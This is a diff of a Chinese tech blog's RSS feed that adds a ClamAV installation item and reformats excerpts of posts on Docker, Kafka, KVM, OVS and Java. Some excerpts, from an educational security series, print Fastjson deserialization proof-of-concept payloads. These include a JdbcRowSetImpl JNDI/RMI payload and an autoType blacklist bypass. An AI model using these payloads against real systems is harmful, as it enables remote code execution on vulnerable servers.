@@ -9,7 +9,21 @@
       <link>https://typesafe.cn/papermod-cover.png</link>
     </image>
     <generator>Hugo -- gohugo.io</generator>
-    <lastBuildDate>Tue, 21 Dec 2021 23:39:00 +0800</lastBuildDate><atom:link href="https://typesafe.cn/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Mon, 07 Mar 2022 21:52:00 +0800</lastBuildDate><atom:link href="https://typesafe.cn/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Linux 杀毒软件 ClamAV 安装</title>
+      <link>https://typesafe.cn/posts/clamav-install/</link>
+      <pubDate>Mon, 07 Mar 2022 21:52:00 +0800</pubDate>
+      
+      <guid>https://typesafe.cn/posts/clamav-install/</guid>
+      <description>Clam AntiVirus（ClamAV）是免费而且开放源代码的杀毒软件，软件与病毒码的更新皆由社群免费发布。Github 地址：https://github.com/Cisco-Talos/clamav
+安装 ClamAV yum install -y clamav* 配置 ClamAV cat &amp;gt; /etc/freshclam.conf &amp;lt;&amp;lt;EOF # 数据库配置文件夹 DatabaseDirectory /var/lib/clamav # 更新日志文件夹 UpdateLogFile /var/log/freshclam.log # 日志大小 LogFileMaxSize 2M # 日志记录时间 LogTime yes # 所属用户 DatabaseOwner root # 同步病毒库的地址 DatabaseMirror database.clamav.net EOF 更新病毒库 大概需要几分钟时间
+freshclam 进行病毒扫描测试 clamscan -ri &amp;lt;/path1/to/scan&amp;gt; &amp;lt;/path2/to/scan&amp;gt; 常用配置说明
+--recursive[=yes/no(*)] -r 递归查找 --infected -I 只打印受影响的文件信息 --remove[=yes/no(*)] 删除受影响的文件。(不建议使用,根据扫描结果进行手动删除,避免误删。) 配置邮箱 如果不需要邮件通知的可以忽略此步骤。
+安装邮件服务 yum install -y mailx 修改配置 修改大写字母为你的邮箱配置
+cat &amp;gt; /etc/mail.rc &amp;lt;&amp;lt;EOF set from=USERNAME@YOURDOMAIN.</description>
+    </item>
+    
     <item>
       <title>在银河麒麟高级服务器操作系统V10上安装docker</title>
       <link>https://typesafe.cn/posts/install-docker-on-kylinos/</link>
@@ -21,7 +35,7 @@
 配置阿里云Centos8镜像源 之所以要配置 Centos8 的镜像源是因为在安装docker的时候需要额外的一些依赖，而这些依赖在麒麟官方的源里面是没有的。
 curl -o /etc/yum.repos.d/CentOS-Base.repo https://mirrors.aliyun.com/repo/Centos-8.repo 配置阿里云 docker 镜像源 yum-config-manager --add-repo https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo sed -i &amp;#39;s+download.docker.com+mirrors.aliyun.com/docker-ce+&amp;#39; /etc/yum.repos.d/docker-ce.repo 定义 yum 变量&amp;amp;修改 repo 修改 centos 和 docker repo文件中的 $releasever 为 centos_version ，原因是在麒麟服务器操作系统V10中 $releasever被修改为了 10，而我们需要使用 centos 8的镜像源，如果你不替换，基本上仓库的每一个地址都是404。
 echo &amp;#34;8&amp;#34; &amp;gt; /etc/yum/vars/centos_version sed -i &amp;#39;s/$releasever/$centos_version/g&amp;#39; /etc/yum.repos.d/docker-ce.repo sed -i &amp;#39;s/$releasever/$centos_version/g&amp;#39; /etc/yum.repos.d/CentOS-Base.repo 建立yum缓存 没啥可说的
-yum makecache 查看docker-ce 版本 yum list docker-ce --showduplicates | sort -r docker-ce.</description>
+yum makecache 查看docker-ce 版本 yum list docker-ce --showduplicates | sort -r  docker-ce.</description>
     </item>
     
     <item>
@@ -46,10 +60,10 @@ if (lexer.token() == JSONToken.LITERAL_STRING) { // 第二个 @type 的值 Strin
       <description>声明 本文章中所有内容仅供学习交流，严禁用于非法用途，否则由此产生的一切后果均与作者无关。
 Fastjson &amp;lt;= 1.2.47 POC 随着 fastjson 的更新，以往的安全漏洞都被封堵掉了，但道高一尺，魔高一丈，安全人员发现了一个通杀的漏洞，以往的封堵手段都可以绕过，算是一个里程碑的发现。
 我们首先将 fastjson 升级到 1.2.47 版本，然后使用我们之前的POC进行测试。
-import com.alibaba.fastjson.JSON; public class Eval3 { public static void main(String[] args) throws Exception { String payload = &amp;#34;{\&amp;#34;@type\&amp;#34;:\&amp;#34;com.sun.rowset.JdbcRowSetImpl\&amp;#34;,\&amp;#34;dataSourceName\&amp;#34;:\&amp;#34;rmi://localhost:1099/Exploit\&amp;#34;,\&amp;#34;autoCommit\&amp;#34;:true}&amp;#34;; JSON.parse(payload); } } 不出意料的话会出现这样的错误提示信息：
+import com.alibaba.fastjson.JSON;  public class Eval3 {   public static void main(String[] args) throws Exception {  String payload = &amp;#34;{\&amp;#34;@type\&amp;#34;:\&amp;#34;com.sun.rowset.JdbcRowSetImpl\&amp;#34;,\&amp;#34;dataSourceName\&amp;#34;:\&amp;#34;rmi://localhost:1099/Exploit\&amp;#34;,\&amp;#34;autoCommit\&amp;#34;:true}&amp;#34;;  JSON.parse(payload);  } } 不出意料的话会出现这样的错误提示信息：
 autoType is not support. com.sun.rowset.JdbcRowSetImpl 这是因为 fastjson 使用了黑名单机制，禁止将 com.sun.rowset.JdbcRowSetImpl 反序列化。
 下面我们使用新的 POC 进行测试，又可以利用成功了。
-import com.alibaba.fastjson.JSON; public class Eval5 { public static void main(String[] args) throws Exception { String payload = &amp;#34;{\&amp;#34;a\&amp;#34;:{\&amp;#34;@type\&amp;#34;:\&amp;#34;java.lang.Class\&amp;#34;,\&amp;#34;val\&amp;#34;:\&amp;#34;com.sun.rowset.JdbcRowSetImpl\&amp;#34;},\&amp;#34;b\&amp;#34;:{\&amp;#34;@type\&amp;#34;:\&amp;#34;com.sun.rowset.JdbcRowSetImpl\&amp;#34;,\&amp;#34;dataSourceName\&amp;#34;:\&amp;#34;rmi://localhost:1099/Exploit\&amp;#34;,\&amp;#34;autoCommit\&amp;#34;:true}}&amp;#34;; JSON.parse(payload); } } payload 格式化之后如下：</description>
+import com.alibaba.fastjson.JSON;  public class Eval5 {   public static void main(String[] args) throws Exception {  String payload = &amp;#34;{\&amp;#34;a\&amp;#34;:{\&amp;#34;@type\&amp;#34;:\&amp;#34;java.</description>
     </item>
     
     <item>
@@ -63,7 +77,7 @@ JNDI 是什么 Java命名和目录接口（Java Naming and Directory Interface�
 JNDI 包含在Java SE中，不需要引用第三方jar即可使用。要使用 JNDI 必须要有一个或多个服务提供者。JDK 本身已经包括了下面几种服务提供者。
  轻量级目录访问协议 (LDAP) CORBA 公共对象服务命名（COS naming） Java 远程方法调用 (RMI) 域名服务 (DNS)  这么说起来还是有点抽象，简单理解就是服务提供者提供一个类似Key Value的数据，JNDI可以通过这个 Key 获取到服务提供者上的提供的Value，因此JNDI是无法单独使用的。
 使用JNDI的方式也很简单，下面就是一个获取远程对象的示例代码。
-// 创建一个上下文对象 InitialContext context = new InitialContext(); // 查找监听在本地 1099 端口上 RMI 服务的 Object 对象 Object obj = context.lookup(&amp;quot;rmi://localhost:1099/Object&amp;quot;); RMI 是什么 RMI 是 Remote Method Invocation 的缩写，中文含义为远程方法调用，即一个Java程序调用调用另一个Java程序暴露出来的方法。
+// 创建一个上下文对象 InitialContext context = new InitialContext(); // 查找监听在本地 1099 端口上 RMI 服务的 Object 对象 Object obj = context.lookup(&amp;#34;rmi://localhost:1099/Object&amp;#34;); RMI 是什么 RMI 是 Remote Method Invocation 的缩写，中文含义为远程方法调用，即一个Java程序调用调用另一个Java程序暴露出来的方法。
 RMI 有三个概念：
  Registry : 提供服务注册和服务获取，服务端将类名称，存放地址注册到Registry中，以供客户端获取。 Server : 远程方法的提供者。 Client : 远程方法的调用者。  远程方法的定义需要满足两个条件：</description>
     </item>
@@ -96,7 +110,7 @@ Fastjson 漏洞产生原因 Fastjson 第一次被爆出有漏洞是官方在2017
       <description>声明 本文章中所有内容仅供学习交流，严禁用于非法用途，否则由此产生的一切后果均与作者无关。
 新的希望 0x00 在上一节中我们介绍了 Java 反序列化漏洞的成因和利用 commons-collections 3.1 搭配 sun.reflect.annotation.AnnotationInvocationHandler 实现远程命令执行的方式。但sun.reflect.annotation.AnnotationInvocationHandler 的问题已经在最新版 jdk 中修复，可利用范围仅能够局限于旧版本的jdk。经过安全人员的审计，另一个类 javax.management.BadAttributeValueExpException 出现在了安全人员的视野。
 javax.management.BadAttributeValueExpException 继承自 java.lang.Exception，java.lang.Exception 继承自 java.lang.Throwable，而 java.lang.Throwable 实现了 java.io.Serializable。因此 javax.management.BadAttributeValueExpException 符合了 可序列化 这个要求，同样的它也增加了 readObject 方法，这个类的完整代码如下：
-package javax.management; import java.io.IOException; import java.io.ObjectInputStream; /** * Thrown when an invalid MBean attribute is passed to a query * constructing method. This exception is used internally by JMX * during the evaluation of a query. User code does not usually * see it.</description>
+package javax.management;  import java.io.IOException; import java.io.ObjectInputStream;   /** * Thrown when an invalid MBean attribute is passed to a query * constructing method. This exception is used internally by JMX * during the evaluation of a query. User code does not usually * see it.</description>
     </item>
     
     <item>
@@ -109,7 +123,7 @@ package javax.management; import java.io.IOException; import java.io.ObjectInput
 序列化的定义 序列化是指将数据结构或对象状态转换成可取用格式，以留待后续在相同或另一台计算机环境中，能恢复原先状态的过程。依照序列化格式重新获取字节的结果时，可以利用它来产生与原始对象相同语义的副本。
 Java 中的序列化 Java 自身提供了序列化的功能，需要实现 java.io.Serializable 接口，标明该对象是可序列化的。 java.io.Serializable 是一个空接口，不需要对象实现方法。
 以下面这段代码为例，展示了一个对象的序列化和反序列化的过程。
-import java.io.*; import java.nio.charset.StandardCharsets; import java.util.Base64; public class Eval0 { public static class Command implements Serializable { private String cmd; public String getCmd() { return cmd; } public void setCmd(String cmd) { this.cmd = cmd; } } public static void main(String[] args) throws Exception { // 定义一个对象  Command command = new Command(); command.setCmd(&amp;#34;calc&amp;#34;); System.out.println(&amp;#34;序列化前: &amp;#34; + command.</description>
+import java.io.*; import java.nio.charset.StandardCharsets; import java.util.Base64;  public class Eval0 {   public static class Command implements Serializable {  private String cmd;   public String getCmd() {  return cmd;  }  public void setCmd(String cmd) {  this.cmd = cmd;  }  }   public static void main(String[] args) throws Exception {  // 定义一个对象  Command command = new Command();  command.</description>
     </item>
     
     <item>
@@ -123,7 +137,7 @@ import java.io.*; import java.nio.charset.StandardCharsets; import java.util.Bas
 kafka-map 介绍 kafka map是使用Java11和React开发的一款kafka可视化工具。
 目前支持的功能有：
  多集群管理 集群状态监控（分区数量、副本数量、存储大小、offset） 主题创建、删除、扩容（删除需配置delete.topic.enable = true） broker状态监控 消费者组查看、删除 重置offset 消息查询（支持String和json方式展示） 发送消息（支持向指定的topic和partition发送字符串消息）  功能截图 添加集群 集群管理 broker 主题管理 消费组 查看消费组已订阅主题 topic详情——分区 topic详情——broker topic详情——消费组 topic详情——消费组重置offset topic详情——配置信息 生产消息 消费消息 docker 方式安装 一行命令即可完成安装
-docker run -d \  -p 8080:8080 \  -v /opt/kafka-map/data:/usr/local/kafka-map/data \  -e DEFAULT_USERNAME=admin -e DEFAULT_PASSWORD=admin --name kafka-map \  --restart always dushixiang/kafka-map:latest 更多安装方式以及相信信息可查看: https://github.com/dushixiang/kafka-map
+docker run -d \  -p 8080:8080 \  -v /opt/kafka-map/data:/usr/local/kafka-map/data \  -e DEFAULT_USERNAME=admin  -e DEFAULT_PASSWORD=admin  --name kafka-map \  --restart always dushixiang/kafka-map:latest 更多安装方式以及相信信息可查看: https://github.com/dushixiang/kafka-map
 欢迎star和分享给其他小伙伴。</description>
     </item>
     
@@ -152,9 +166,9 @@ systemctl enable openvswitch &amp;amp;&amp;amp; systemctl start openvswitch 创�
       <description>一、镜像扩容 注意：需要先关闭虚拟机才能操作，+号前面有空格，后面没有空格。
 qemu-img resize test.qcow2 +80G 原镜像磁盘大小20GB，扩容完成后可使用以下命令查看
 qemu-img info test.qcow2 输出
-image: test.qcow2 file format: qcow2 virtual size: 100G (107374182400 bytes) disk size: 885M cluster_size: 65536 Format specific information: compat: 1.1 lazy refcounts: false refcount bits: 16 corrupt: false 二、Windows磁盘扩容 Windows磁盘扩容比较方便，进入 计算机管理&amp;gt;磁盘管理 找到新增的分区把它添加到需要的分区即可。
+image: test.qcow2 file format: qcow2 virtual size: 100G (107374182400 bytes) disk size: 885M cluster_size: 65536 Format specific information:  compat: 1.1  lazy refcounts: false  refcount bits: 16  corrupt: false 二、Windows磁盘扩容 Windows磁盘扩容比较方便，进入 计算机管理&amp;gt;磁盘管理 找到新增的分区把它添加到需要的分区即可。
 三、Linux磁盘扩容 启动虚拟机后，进入虚拟机控制台，使用fdisk -l命令查看磁盘信息。
-Disk /dev/vda: 100 GiB, 107374182400 bytes, 209715200 sectors Units: sectors of 1 * 512 = 512 bytes Sector size (logical/physical): 512 bytes / 512 bytes I/O size (minimum/optimal): 512 bytes / 512 bytes Disklabel type: dos Disk identifier: 0xe11f7f01 Device Boot Start End Sectors Size Id Type /dev/vda1 * 2048 2099199 2097152 1G 83 Linux /dev/vda2 2099200 41943039 39843840 19G 8e Linux LVM Disk /dev/mapper/cl-root: 17 GiB, 18249416704 bytes, 35643392 sectors Units: sectors of 1 * 512 = 512 bytes Sector size (logical/physical): 512 bytes / 512 bytes I/O size (minimum/optimal): 512 bytes / 512 bytes Disk /dev/mapper/cl-swap: 2 GiB, 2147483648 bytes, 4194304 sectors Units: sectors of 1 * 512 = 512 bytes Sector size (logical/physical): 512 bytes / 512 bytes I/O size (minimum/optimal): 512 bytes / 512 bytes 可以看到这台虚拟机的磁盘大小已经有100GB了，但分区大小还是没有变化，只有初始大小20GB。</description>
+Disk /dev/vda: 100 GiB, 107374182400 bytes, 209715200 sectors Units: sectors of 1 * 512 = 512 bytes Sector size (logical/physical): 512 bytes / 512 bytes I/O size (minimum/optimal): 512 bytes / 512 bytes Disklabel type: dos Disk identifier: 0xe11f7f01  Device Boot Start End Sectors Size Id Type /dev/vda1 * 2048 2099199 2097152 1G 83 Linux /dev/vda2 2099200 41943039 39843840 19G 8e Linux LVM   Disk /dev/mapper/cl-root: 17 GiB, 18249416704 bytes, 35643392 sectors Units: sectors of 1 * 512 = 512 bytes Sector size (logical/physical): 512 bytes / 512 bytes I/O size (minimum/optimal): 512 bytes / 512 bytes   Disk /dev/mapper/cl-swap: 2 GiB, 2147483648 bytes, 4194304 sectors Units: sectors of 1 * 512 = 512 bytes Sector size (logical/physical): 512 bytes / 512 bytes I/O size (minimum/optimal): 512 bytes / 512 bytes 可以看到这台虚拟机的磁盘大小已经有100GB了，但分区大小还是没有变化，只有初始大小20GB。</description>
     </item>
     
     <item>
@@ -187,7 +201,7 @@ yum install -y virt-manager 在支持x11转发的ssh客户端（例如：MobaXte
       <description>之前我们介绍Network Namespace（以下简称netns）和veth pair时说过docker是使用这些技术来实现的网络隔离，今天我们就来一探究竟，看下docker到底是如何做到的。
 启动一个无网络的容器 首先我们使用 --net=none 参数启动一个无网络的容器，为了方便调试，这里我们使用了centos镜像。
 docker run -itd --name centos-test --net=none centos 启动成功之后我们进入容器内部确认一下是否无网卡。
-[root@localhost ~]# docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 28dc2e8853df centos &amp;#34;/bin/bash&amp;#34; 24 seconds ago Up 23 seconds centos-test [root@localhost ~]# docker exec -it 28dc2e8853df bash [root@28dc2e8853df /]# ip a 1: lo: &amp;lt;LOOPBACK,UP,LOWER_UP&amp;gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever 可以看到确实只有一个本地环回网卡。</description>
+[root@localhost ~]# docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 28dc2e8853df centos &amp;#34;/bin/bash&amp;#34; 24 seconds ago Up 23 seconds centos-test [root@localhost ~]# docker exec -it 28dc2e8853df bash [root@28dc2e8853df /]# ip a 1: lo: &amp;lt;LOOPBACK,UP,LOWER_UP&amp;gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000  link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00  inet 127.0.0.1/8 scope host lo  valid_lft forever preferred_lft forever 可以看到确实只有一个本地环回网卡。</description>
     </item>
     
     <item>
@@ -199,7 +213,7 @@ docker run -itd --name centos-test --net=none centos 启动成功之后我们进
       <description>虚拟化开发相较于普通开发是一个冷门的方向，大多数是使用Python开发，其中使用Java来做虚拟化的少之又少，资料更是少的可怜，为了实现需求我也是踩了不少坑，今天就为大家分享一下如何使用 libvirt-java 来采集KVM虚拟机的资源使用信息。
 CPU使用率 libvirt并没有直接提供获取虚拟机CPU使用率的接口，需要我们自己来计算，网上分享的代码或者公式五花八门，大部分都是错误的，经过我的测试，找到了一个相对准确的计算公式。
 cpu_usage = (cpu_time_now - cpu_time_t_second_ago) * 100 / (t * vCpus * 10^9) Java代码如下
-// t秒前的CPU时间 long c1 = domain.getInfo().cpuTime; Thread.sleep(1000); // 当前CPU时间 long c2 = domain.getInfo().cpuTime; // 虚拟CPU数量 int vCpus = domain.getMaxVcpus(); // t 为1秒 Double cpuUsage = 100 * (c2 - c1) / (1 * vCpus * Math.pow(10, 9)); log.debug(&amp;#34;虚拟机[{}]CPU使用率为: {}&amp;#34;, uuid, cpuUsage); 内存使用率 不要使用domain.getInfo()返回的 memory字段，虽然它注释写的是the memory in KBytes used by the domain，但它的意思真的不是虚拟机内部进程已使用的内存大小，而是从宿主机器的角度来看分配给这个虚拟机的内存它使用了多少，如果没有特殊配置，它会和maxMem字段的值是相同的。</description>
+// t秒前的CPU时间 long c1 = domain.getInfo().cpuTime; Thread.sleep(1000); // 当前CPU时间 long c2 = domain.getInfo().cpuTime;  // 虚拟CPU数量 int vCpus = domain.getMaxVcpus(); // t 为1秒 Double cpuUsage = 100 * (c2 - c1) / (1 * vCpus * Math.pow(10, 9)); log.debug(&amp;#34;虚拟机[{}]CPU使用率为: {}&amp;#34;, uuid, cpuUsage); 内存使用率 不要使用domain.getInfo()返回的 memory字段，虽然它注释写的是the memory in KBytes used by the domain，但它的意思真的不是虚拟机内部进程已使用的内存大小，而是从宿主机器的角度来看分配给这个虚拟机的内存它使用了多少，如果没有特殊配置，它会和maxMem字段的值是相同的。</description>
     </item>
     
     <item>
@@ -222,7 +236,7 @@ cpu_usage = (cpu_time_now - cpu_time_t_second_ago) * 100 / (t * vCpus * 10^9) Ja
 举个例子：当你需要一个24小时的延迟消息队列，在代码里面写下了Thread.sleep(1000*60*60*24);，为了不发生rebalance，你把max.poll.interval.ms 也改成了1000*60*60*24，这个时候你或许会感觉到一丝丝的怪异，我是谁？我在哪？我为什么要写出来这样的代码？
 其实我们可以更优雅的处理这个问题。
 KafkaConsumer 提供了暂停和恢复的API函数，调用消费者的暂停方法后就无法再拉取到新的消息，同时长时间不消费kafka也不会认为这个消费者已经挂掉了。另外为了能够更加优雅，我们会启动一个定时器来替换sleep。，完整流程如下图，当消费者发现消息不满足条件时，我们就暂停消费者，并把偏移量seek到上一次消费的位置以便等待下一个周期再次消费这条消息。
-Java代码实现 import com.fasterxml.jackson.core.JsonProcessingException; import com.fasterxml.jackson.databind.JsonNode; import com.fasterxml.jackson.databind.ObjectMapper; import org.apache.kafka.clients.consumer.*; import org.apache.kafka.clients.producer.KafkaProducer; import org.apache.kafka.clients.producer.ProducerConfig; import org.apache.kafka.clients.producer.ProducerRecord; import org.apache.kafka.common.TopicPartition; import org.apache.kafka.common.serialization.StringDeserializer; import org.apache.kafka.common.serialization.StringSerializer; import org.junit.jupiter.api.BeforeEach; import org.junit.jupiter.api.Test; import org.springframework.boot.test.context.SpringBootTest; import java.time.Duration; import java.util.*; import java.util.concurrent.ExecutionException; @SpringBootTest public class DelayQueueTest { private KafkaConsumer&amp;lt;String, String&amp;gt; consumer; private KafkaProducer&amp;lt;String, String&amp;gt; producer; private volatile Boolean exit = false; private final Object lock = new Object(); private final String servers = &amp;#34;&amp;#34;; @BeforeEach void initConsumer() { Properties props = new Properties(); props.</description>
+Java代码实现 import com.fasterxml.jackson.core.JsonProcessingException; import com.fasterxml.jackson.databind.JsonNode; import com.fasterxml.jackson.databind.ObjectMapper; import org.apache.kafka.clients.consumer.*; import org.apache.kafka.clients.producer.KafkaProducer; import org.apache.kafka.clients.producer.ProducerConfig; import org.apache.kafka.clients.producer.ProducerRecord; import org.apache.kafka.common.TopicPartition; import org.apache.kafka.common.serialization.StringDeserializer; import org.apache.kafka.common.serialization.StringSerializer; import org.junit.jupiter.api.BeforeEach; import org.junit.jupiter.api.Test; import org.springframework.boot.test.context.SpringBootTest;  import java.time.Duration; import java.util.*; import java.util.concurrent.ExecutionException;  @SpringBootTest public class DelayQueueTest {   private KafkaConsumer&amp;lt;String, String&amp;gt; consumer;  private KafkaProducer&amp;lt;String, String&amp;gt; producer;  private volatile Boolean exit = false;  private final Object lock = new Object();  private final String servers = &amp;#34;&amp;#34;;   @BeforeEach  void initConsumer() {  Properties props = new Properties();  props.</description>
     </item>
     
     <item>
@@ -236,7 +250,7 @@ Java代码实现 import com.fasterxml.jackson.core.JsonProcessingException; impo
 Java的保留关键字 goto和const 在Java里面没有goto这个功能，但它作为保留字是无法当做变量来使用的，const也是同样。
 int goto = 0; int const = 0; 上面这两行代码的写法存在问题，无法正常编译通过。
 Java标签Label 上面说了在Java里面没有goto这个功能，但为了处理多重循环引入了Label，目的是为了在多重循环中方便的使用 break 和coutinue ，但好像在其他地方也可以用。
-outerLoop: while (true) { System.out.println(&amp;#34;I&amp;#39;m the outer loop&amp;#34;); int i = 0; while (true) { System.out.println(&amp;#34;I am the inner loop&amp;#34;); i++; if (i &amp;gt;= 3) { break outerLoop; } } } System.out.println(&amp;#34;Complete the loop&amp;#34;); // 输出 I&amp;#39;m the outer loop I am the inner loop I am the inner loop I am the inner loop Complete the loop test: { System.</description>
+outerLoop: while (true) { 	System.out.println(&amp;#34;I&amp;#39;m the outer loop&amp;#34;); 	int i = 0; 	while (true) { 	System.out.println(&amp;#34;I am the inner loop&amp;#34;); 	i++; 	if (i &amp;gt;= 3) { 	break outerLoop; 	} 	} } System.out.println(&amp;#34;Complete the loop&amp;#34;);  // 输出 I&amp;#39;m the outer loop I am the inner loop I am the inner loop I am the inner loop Complete the loop test: { 	System.</description>
     </item>
     
     <item>
@@ -260,7 +274,7 @@ broadcast 10.141.128.0 dev eth0 proto kernel scope link src 10.141.155.131 local
       <pubDate>Mon, 11 Jan 2021 15:40:41 +0000</pubDate>
       
       <guid>https://typesafe.cn/posts/linux-limit/</guid>
-      <description>echo &amp;quot;fs.file-max=655350&amp;quot; &amp;gt;&amp;gt;/etc/sysctl.conf echo &amp;quot;* soft nofile 655350&amp;quot; &amp;gt;&amp;gt; /etc/security/limits.conf echo &amp;quot;* hard nofile 655350&amp;quot; &amp;gt;&amp;gt; /etc/security/limits.conf ulimit -n 655350 </description>
+      <description>echo &amp;#34;fs.file-max=655350&amp;#34; &amp;gt;&amp;gt;/etc/sysctl.conf echo &amp;#34;* soft nofile 655350&amp;#34; &amp;gt;&amp;gt; /etc/security/limits.conf echo &amp;#34;* hard nofile 655350&amp;#34; &amp;gt;&amp;gt; /etc/security/limits.conf ulimit -n 655350 </description>
     </item>
     
     <item>
@@ -301,7 +315,7 @@ VXLAN解决了什么问题？ 最近几年，阿里云，腾讯云，京东云�
       <description>OpenvSwitch flow table 流表  OpenFlow（OF）被认为是第一个软件定义网络（SDN）标准之一。它最初在SDN环境中定义了通信协议，使SDN控制器能够与物理和虚拟的交换机和路由器等网络设备的转发平面直接进行交互，从而更好地适应不断变化的业务需求。
  如果把OpenFlow控制器比作“大脑”，OVS流表就像是“大腿”一样接受来自“大脑”的指令，决定要向哪个方向前进。但OVS流表功能更加强大，在没有OpenFlow控制器时，也可以自主工作，它本身也供一些命令让我们可以直接管理流表。
 操作命令 查看流表规则 # 查看br-tun上的全部流表规则 ovs-ofctl dump-flows br-tun 添加或修改流表规则 ovs-ofctl add−flow／add−flows／mod−flows “流表匹配条件,actions=[动作1][,动作2…]” 如果你有过编程的经验，流表规则其实就是一个个简单的if语句，伪代码如下。
-if (流表匹配条件){ 动作1， 动作2... } if (流表匹配条件){ 动作1， 动作2... } 删除流表规则 # 删除br-tun上的全部流表规则 ovs-ofctl del-flows br-tun # 删除br-tun上匹配xx的全部流表规则 ovs-ofctl del-flows br-tun xx 流表匹配条件 OVS 流表匹配条件较多，下面我将其分成四部分来说明，分别是:
+if (流表匹配条件){ 动作1， 动作2... } if (流表匹配条件){ 动作1， 动作2... } 删除流表规则 # 删除br-tun上的全部流表规则 ovs-ofctl del-flows br-tun  # 删除br-tun上匹配xx的全部流表规则 ovs-ofctl del-flows br-tun xx 流表匹配条件 OVS 流表匹配条件较多，下面我将其分成四部分来说明，分别是:
  OVS匹配条件 OSI模型第二层【数据链路层】 OSI模型第三层【网络层】 OSI模型第四层【传输层】  OVS匹配条件 in_port=port 流量进入的端口编号或者名称，示例 in_port=br-int
 table=number 规则保存的流表编号，范围是 0-254，默认值：0。
 OSI模型第二层【数据链路层】 dl 即是 data link 的缩写。
@@ -322,7 +336,7 @@ OVS提供了相关命令来配置或删除端口镜像，下面我们来实验�
 ovs-vsctl -- set Bridge &amp;lt;bridge_name&amp;gt; mirrors=@m \  -- --id=@&amp;lt;port0&amp;gt; get Port &amp;lt;port0&amp;gt; \  -- --id=@&amp;lt;port1&amp;gt; get Port &amp;lt;port1&amp;gt; \  -- --id=@m create Mirror name=&amp;lt;mirror_name&amp;gt; select-dst-port=@&amp;lt;port0&amp;gt; select-src-port=@&amp;lt;port0&amp;gt; output-port=@&amp;lt;port1&amp;gt;  这行命令会输出一个镜像ID
  删除端口镜像
 ovs-vsctl remove Bridge &amp;lt;bridge-name&amp;gt; mirrors &amp;lt;mirror-id&amp;gt; 在原端口镜像的基础上增加一个镜像源
-# 获取端口的ID ovs-vsctl get port &amp;lt;port_name&amp;gt; _uuid # 在原端口镜像的基础上增加镜像源 ovs-vsctl add Mirror &amp;lt;mirror-name&amp;gt; select_src_port &amp;lt;port-id&amp;gt; ovs-vsctl add Mirror &amp;lt;mirror-name&amp;gt; select_dst_port &amp;lt;port-id&amp;gt; 在原端口镜像的基础上删除一个镜像源</description>
+# 获取端口的ID ovs-vsctl get port &amp;lt;port_name&amp;gt; _uuid  # 在原端口镜像的基础上增加镜像源 ovs-vsctl add Mirror &amp;lt;mirror-name&amp;gt; select_src_port &amp;lt;port-id&amp;gt; ovs-vsctl add Mirror &amp;lt;mirror-name&amp;gt; select_dst_port &amp;lt;port-id&amp;gt; 在原端口镜像的基础上删除一个镜像源</description>
     </item>
     
     <item>
@@ -334,7 +348,7 @@ ovs-vsctl remove Bridge &amp;lt;bridge-name&amp;gt; mirrors &amp;lt;mirror-id&am
       <description>使用OVS构建分布式隔离网络 前言 上一节我们使用OVS构建了单机隔离网络，但是随着网络规模的扩张，单节点已经不再能满足业务的需要，分布式网络成了必不可少的环节。分布式网络与单节点网络在细节实现上基本一致，只有物理环境网络连线上的一点区别。
 实验1：分布式无隔离网络 网络拓扑如下图所示，我们每一台节点都有两张网卡，一张用于管理，一张用于业务。之所以使用两张网卡有两个原因：
  管理网卡用于日常的维护登录，业务网卡用于传输虚拟节点的数据报文，避免相互之间影响。 我们要将业务网卡绑定到OVS网桥上，也就是Normal类型的Port。这种方式添加的Port不支持分配IP地址，如果之前网卡上配置的有IP，挂载到OVS上面之后将不可访问。   需要注意的是，如果是使用物理环境搭建网络拓扑，需要把业务网卡对应的交换机端口配置为trunk模式。如果是使用VmWare搭建网络拓扑，业务网卡需要配置网络类型为仅主机模式。
- 配置  配置环境 主机A  ovs-vsctl add-br br-int # 请修改eth1为当前实验环境的业务网卡名称 ovs-vsctl add-port br-int eth1 # 添加两个内部端口 ovs-vsctl add-port br-int vnet0 -- set Interface vnet0 type=internal ovs-vsctl add-port br-int vnet1 -- set Interface vnet1 type=internal # 添加两个netns ip netns add ns0 ip netns add ns1 # 将内部端口分别移动到netns中 ip link set vnet0 netns ns0 ip link set vnet1 netns ns1 # 启动端口并配置IP ip netns exec ns0 ip link set lo up ip netns exec ns0 ip link set vnet0 up ip netns exec ns0 ip addr add 10.</description>
+ 配置  配置环境 主机A  ovs-vsctl add-br br-int # 请修改eth1为当前实验环境的业务网卡名称 ovs-vsctl add-port br-int eth1  # 添加两个内部端口 ovs-vsctl add-port br-int vnet0 -- set Interface vnet0 type=internal ovs-vsctl add-port br-int vnet1 -- set Interface vnet1 type=internal # 添加两个netns ip netns add ns0 ip netns add ns1 # 将内部端口分别移动到netns中 ip link set vnet0 netns ns0 ip link set vnet1 netns ns1  # 启动端口并配置IP ip netns exec ns0 ip link set lo up ip netns exec ns0 ip link set vnet0 up ip netns exec ns0 ip addr add 10.</description>
     </item>
     
     <item>
@@ -346,7 +360,7 @@ ovs-vsctl remove Bridge &amp;lt;bridge-name&amp;gt; mirrors &amp;lt;mirror-id&am
       <description>前言 在前面我们已经使用Linux Bridge完成了多台网络设备的通信，但是它对于网络隔离的支持不是很好，长期以来，在Linux平台上缺少一个功能完备的虚拟交换机，直到OVS的出现。
 实验 接下来我们来尝试完成两个实验，单机无隔离网络、单机隔离网络。
 实验一：单机无隔离网络 使用ovs构建无隔离网络非常简单，只需要添加一个网桥，然后在这个网桥上再增加几个内部端口，最后把端口移动到netns中即可。
